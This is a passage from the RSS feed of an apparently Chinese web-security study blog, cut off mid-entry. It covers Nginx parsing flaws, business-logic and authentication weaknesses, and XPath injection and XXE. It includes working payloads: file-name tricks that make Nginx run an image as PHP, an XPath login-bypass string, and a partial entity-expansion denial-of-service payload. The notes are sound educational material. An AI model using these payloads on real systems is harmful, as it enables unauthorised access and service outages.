&lt;p&gt;在 Fast-CGI 关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径 (xx.jpg) 后面加上  &lt;code&gt;%00.php&lt;/code&gt;  ， 即  &lt;code&gt;xx.jpg%00.php&lt;/code&gt;  会被当做 php 文件来解析&lt;/p&gt;
&lt;h2 id=&#34;fast-cgi开启&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fast-cgi开启&#34;&gt;#&lt;/a&gt; Fast-CGI 开启&lt;/h2&gt;
&lt;p&gt;在 Fast-CGI 开启状态下，在文件路径后加上  &lt;code&gt;/xx.php&lt;/code&gt;  ，则  &lt;code&gt;xx.jpg/xx.php&lt;/code&gt;  会被解析为 php 文件&lt;/p&gt;
&lt;h2 id=&#34;cve-2013-4547&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2013-4547&#34;&gt;#&lt;/a&gt; CVE-2013-4547&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;a.jpg\x20\x00.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;配置错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置错误&#34;&gt;#&lt;/a&gt; 配置错误&lt;/h2&gt;
&lt;h3 id=&#34;目录穿越&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录穿越&#34;&gt;#&lt;/a&gt; 目录穿越&lt;/h3&gt;
&lt;p&gt;如果配置中存在类似  &lt;code&gt;location /foo &amp;#123; alias /bar/; &amp;#125;&lt;/code&gt;  的配置时， &lt;code&gt;/foo../&lt;/code&gt;  会被解析为  &lt;code&gt;/bar/../&lt;/code&gt;  从而导致目录穿越的发生。&lt;/p&gt;
&lt;h3 id=&#34;目录遍历-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录遍历-2&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h3&gt;
&lt;p&gt;配置中  &lt;code&gt;autoindex on&lt;/code&gt;  开启时，Nginx 中存在目录遍历漏洞。&lt;/p&gt;
&lt;h2 id=&#34;参考链接-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接-2&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy85MDY0Lmh0bWw=&#34;&gt;CVE-2013-4547 Nginx 解析漏洞深入利用及分析&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/</guid>
            <title>配置与策略安全</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/</link>
            <category>网络安全</category>
            <category>策略配置</category>
            <pubDate>Sun, 27 Nov 2022 10:57:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;认证策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#认证策略&#34;&gt;#&lt;/a&gt; 认证策略&lt;/h1&gt;
&lt;h2 id=&#34;密码策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码策略&#34;&gt;#&lt;/a&gt; 密码策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;未限制密码最低位数&lt;/li&gt;
&lt;li&gt;未限制密码必须包含字符集&lt;/li&gt;
&lt;li&gt;为常用密码&lt;/li&gt;
&lt;li&gt;个人信息相关
&lt;ul&gt;
&lt;li&gt;手机号&lt;/li&gt;
&lt;li&gt;生日&lt;/li&gt;
&lt;li&gt;姓名&lt;/li&gt;
&lt;li&gt;用户名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;未检测常见弱密码
&lt;ul&gt;
&lt;li&gt;已泄露的常用密码&lt;/li&gt;
&lt;li&gt;键盘模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加密实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加密实现&#34;&gt;#&lt;/a&gt; 加密实现&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在客户端存储私钥&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;权限配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限配置&#34;&gt;#&lt;/a&gt; 权限配置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;运维人员权限粒度过大&lt;/li&gt;
&lt;li&gt;客服人员权限粒度过大&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;供应链安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#供应链安全&#34;&gt;#&lt;/a&gt; 供应链安全&lt;/h1&gt;
&lt;h2 id=&#34;三方认证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三方认证&#34;&gt;#&lt;/a&gt; 三方认证&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;利用被攻击的第三方服务账号登录其他平台账号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;三方库软件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三方库软件&#34;&gt;#&lt;/a&gt; 三方库 / 软件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;公开漏洞后没有及时更新&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/</guid>
            <title>逻辑漏洞/业务漏洞</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>逻辑</category>
            <pubDate>Sun, 27 Nov 2022 10:50:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。&lt;/p&gt;
&lt;p&gt;在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。&lt;/p&gt;
&lt;h1 id=&#34;安装逻辑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装逻辑&#34;&gt;#&lt;/a&gt; 安装逻辑&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;查看能否绕过判定重新安装&lt;/li&gt;
&lt;li&gt;查看能否利用安装文件获取信息&lt;/li&gt;
&lt;li&gt;看能否利用更新功能获取信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;交易&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交易&#34;&gt;#&lt;/a&gt; 交易&lt;/h1&gt;
&lt;h2 id=&#34;购买&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#购买&#34;&gt;#&lt;/a&gt; 购买&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;修改支付的价格&lt;/li&gt;
&lt;li&gt;修改支付的状态&lt;/li&gt;
&lt;li&gt;修改购买数量为负数&lt;/li&gt;
&lt;li&gt;修改金额为负数&lt;/li&gt;
&lt;li&gt;重放成功的请求&lt;/li&gt;
&lt;li&gt;并发数据库锁处理不当&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;业务风控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#业务风控&#34;&gt;#&lt;/a&gt; 业务风控&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;刷优惠券&lt;/li&gt;
&lt;li&gt;套现&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#账户&#34;&gt;#&lt;/a&gt; 账户&lt;/h1&gt;
&lt;h2 id=&#34;注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册&#34;&gt;#&lt;/a&gt; 注册&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;覆盖注册&lt;/li&gt;
&lt;li&gt;尝试重复用户名&lt;/li&gt;
&lt;li&gt;注册遍历猜解已有账号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码&#34;&gt;#&lt;/a&gt; 密码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;密码未使用哈希算法保存&lt;/li&gt;
&lt;li&gt;没有验证用户设置密码的强度&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;邮箱用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮箱用户名&#34;&gt;#&lt;/a&gt; 邮箱用户名&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前后空格&lt;/li&gt;
&lt;li&gt;大小写变换&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cookie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie&#34;&gt;#&lt;/a&gt; Cookie&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;包含敏感信息&lt;/li&gt;
&lt;li&gt;未验证合法性可伪造&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;手机号用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#手机号用户名&#34;&gt;#&lt;/a&gt; 手机号用户名&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前后空格&lt;/li&gt;
&lt;li&gt;+86&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录&#34;&gt;#&lt;/a&gt; 登录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;撞库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置异地登录检查等机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号劫持&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;恶意尝试帐号密码锁死账户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要设置锁定机制与解锁机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不安全的传输信道&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录凭证存储在不安全的位置&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;找回密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找回密码&#34;&gt;#&lt;/a&gt; 找回密码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;重置任意用户密码&lt;/li&gt;
&lt;li&gt;密码重置后新密码在返回包中&lt;/li&gt;
&lt;li&gt;Token 验证逻辑在前端&lt;/li&gt;
&lt;li&gt;X-Forwarded-Host 处理不正确&lt;/li&gt;
&lt;li&gt;找回密码功能泄露用户敏感信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;修改密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改密码&#34;&gt;#&lt;/a&gt; 修改密码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;越权修改密码&lt;/li&gt;
&lt;li&gt;修改密码没有旧密码验证&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;申诉&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#申诉&#34;&gt;#&lt;/a&gt; 申诉&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;身份伪造&lt;/li&gt;
&lt;li&gt;逻辑绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;更新&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更新&#34;&gt;#&lt;/a&gt; 更新&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ORM 更新操作不当可更新任意字段&lt;/li&gt;
&lt;li&gt;权限限制不当可以越权修改&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息查询&#34;&gt;#&lt;/a&gt; 信息查询&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;权限限制不当可以越权查询&lt;/li&gt;
&lt;li&gt;用户信息 ID 可以猜测导致遍历&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2fa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2fa&#34;&gt;#&lt;/a&gt; 2FA&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;重置密码后自动登录没有 2FA&lt;/li&gt;
&lt;li&gt;OAuth 登录没有启用 2FA&lt;/li&gt;
&lt;li&gt;2FA 可爆破&lt;/li&gt;
&lt;li&gt;2FA 有条件竞争&lt;/li&gt;
&lt;li&gt;修改返回值绕过&lt;/li&gt;
&lt;li&gt;激活链接没有启用 2FA&lt;/li&gt;
&lt;li&gt;可通过 CSRF 禁用 2FA&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;验证码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证码&#34;&gt;#&lt;/a&gt; 验证码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;验证码可重用&lt;/li&gt;
&lt;li&gt;验证码可预测&lt;/li&gt;
&lt;li&gt;验证码强度不够&lt;/li&gt;
&lt;li&gt;验证码无时间限制或者失效时间长&lt;/li&gt;
&lt;li&gt;验证码无猜测次数限制&lt;/li&gt;
&lt;li&gt;验证码传递特殊的参数或不传递参数绕过&lt;/li&gt;
&lt;li&gt;验证码可从返回包中直接获取&lt;/li&gt;
&lt;li&gt;验证码不刷新或无效&lt;/li&gt;
&lt;li&gt;验证码数量有限&lt;/li&gt;
&lt;li&gt;验证码在数据包中返回&lt;/li&gt;
&lt;li&gt;修改 Cookie 绕过&lt;/li&gt;
&lt;li&gt;修改返回包绕过&lt;/li&gt;
&lt;li&gt;验证码在客户端生成或校验&lt;/li&gt;
&lt;li&gt;验证码可 OCR 或使用机器学习识别&lt;/li&gt;
&lt;li&gt;验证码用于手机短信 / 邮箱轰炸&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#session&#34;&gt;#&lt;/a&gt; Session&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Session 机制&lt;/li&gt;
&lt;li&gt;Session 猜测 / 爆破&lt;/li&gt;
&lt;li&gt;Session 伪造&lt;/li&gt;
&lt;li&gt;Session 泄漏&lt;/li&gt;
&lt;li&gt;Session Fixation&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;越权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#越权&#34;&gt;#&lt;/a&gt; 越权&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;未授权访问&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态文件&lt;/li&gt;
&lt;li&gt;通过特定 url 来防止被访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;水平越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击者可以访问与他拥有相同权限的用户的资源&lt;/li&gt;
&lt;li&gt;权限类型不变，ID 改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;垂直越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低级别攻击者可以访问高级别用户的资源&lt;/li&gt;
&lt;li&gt;权限 ID 不变，类型改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交叉越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;权限 ID 改变，类型改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;随机数安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#随机数安全&#34;&gt;#&lt;/a&gt; 随机数安全&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用不安全的随机数发生器&lt;/li&gt;
&lt;li&gt;使用时间等易猜解的因素作为随机数种子&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用户 / 订单 / 优惠券等 ID 生成有规律，可枚举&lt;/li&gt;
&lt;li&gt;接口无权限、次数限制&lt;/li&gt;
&lt;li&gt;加密算法实现误用&lt;/li&gt;
&lt;li&gt;执行顺序&lt;/li&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbXlsdXR0ZS9hcnRpY2xlL2RldGFpbHMvNTA4MTkxNDYjMTAwMDYtd2VpeGluLTEtNTI2MjYtNmIzYmZmZDAxZmRkZTQ5MDAxMzBiYzVhMjc1MWI2ZDE=&#34;&gt;水平越权漏洞及其解决方案&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjAyOQ==&#34;&gt;细说验证码安全 测试思路大梳理&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/</guid>
            <title>Xpath</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>Xpath</category>
            <pubDate>Sun, 27 Nov 2022 10:44:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xpath定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xpath定义&#34;&gt;#&lt;/a&gt; Xpath 定义&lt;/h1&gt;
&lt;p&gt;XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。&lt;/p&gt;
&lt;h1 id=&#34;xpath注入攻击原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xpath注入攻击原理&#34;&gt;#&lt;/a&gt; Xpath 注入攻击原理&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user 表中的用户名 （username）和密码（password）的结果来进行授权访问，&lt;/p&gt;
&lt;p&gt;例存在 user.xml 文件如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;users&amp;gt;
     &amp;lt;user&amp;gt;
         &amp;lt;firstname&amp;gt;Ben&amp;lt;/firstname&amp;gt;
         &amp;lt;lastname&amp;gt;Elmore&amp;lt;/lastname&amp;gt;
         &amp;lt;loginID&amp;gt;abc&amp;lt;/loginID&amp;gt;
         &amp;lt;password&amp;gt;test123&amp;lt;/password&amp;gt;
     &amp;lt;/user&amp;gt;
     &amp;lt;user&amp;gt;
         &amp;lt;firstname&amp;gt;Shlomy&amp;lt;/firstname&amp;gt;
         &amp;lt;lastname&amp;gt;Gantz&amp;lt;/lastname&amp;gt;
         &amp;lt;loginID&amp;gt;xyz&amp;lt;/loginID&amp;gt;
         &amp;lt;password&amp;gt;123test&amp;lt;/password&amp;gt;
     &amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;则在 XPath 中其典型的查询语句为：  &lt;code&gt;//users/user[loginID/text()=&#39;xyz&#39;and password/text()=&#39;123test&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如  &lt;code&gt;loginID = &#39;xyz&#39; 和 password = &#39;123test&#39;&lt;/code&gt;  ，则该查询语句将返回 true。但如果用户传入类似  &lt;code&gt;&#39; or 1=1 or &#39;&#39;=&#39;&lt;/code&gt;  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： &lt;code&gt;//users/user[loginID/text()=&#39;&#39;or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/</guid>
            <title>XXE</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XXE/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>XXE</category>
            <category>XML</category>
            <pubDate>Sun, 27 Nov 2022 09:31:19 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xml基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xml基础&#34;&gt;#&lt;/a&gt; XML 基础&lt;/h1&gt;
&lt;p&gt;XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。目前，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。&lt;/p&gt;
&lt;h1 id=&#34;基本语法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本语法&#34;&gt;#&lt;/a&gt; 基本语法&lt;/h1&gt;
&lt;p&gt;XML 文档在开头有  &lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;&lt;/code&gt;  的结构，这种结构被称为 XML prolog ，用于声明 XML 文档的版本和编码，是可选的，但是必须放在文档开头。&lt;/p&gt;
&lt;p&gt;除了可选的开头外，XML 语法主要有以下的特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有 XML 元素都须有关闭标签&lt;/li&gt;
&lt;li&gt;XML 标签对大小写敏感&lt;/li&gt;
&lt;li&gt;XML 必须正确地嵌套&lt;/li&gt;
&lt;li&gt;XML 文档必须有根元素&lt;/li&gt;
&lt;li&gt;XML 的属性值需要加引号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;另外，XML 也有 CDATA 语法，用于处理有多个字符需要转义的情况。&lt;/p&gt;
&lt;h1 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h1&gt;
&lt;p&gt;当允许引用外部实体时，可通过构造恶意的 XML 内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的 XXE 攻击，只有在服务器有回显或者报错的基础上才能使用 XXE 漏洞来读取服务器端文件，但是也可以通过 Blind XXE 的方式实现攻击。&lt;/p&gt;
&lt;h1 id=&#34;攻击方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击方式&#34;&gt;#&lt;/a&gt; 攻击方式&lt;/h1&gt;
&lt;h2 id=&#34;拒绝服务攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拒绝服务攻击&#34;&gt;#&lt;/a&gt; 拒绝服务攻击&lt;/h2&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token doctype&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&#34;token doctype-tag&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&#34;token name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token internal-subset&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ELEMENT&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;(#ANY)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a0&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;dos&#34;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a1&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&amp;amp;a0;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;!ENTITY&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;a2&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&#34;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&amp;amp;a1;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token entity named-entity&#34; title=&#34;&amp;a2;&#34;&gt;&amp;amp;a2;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span 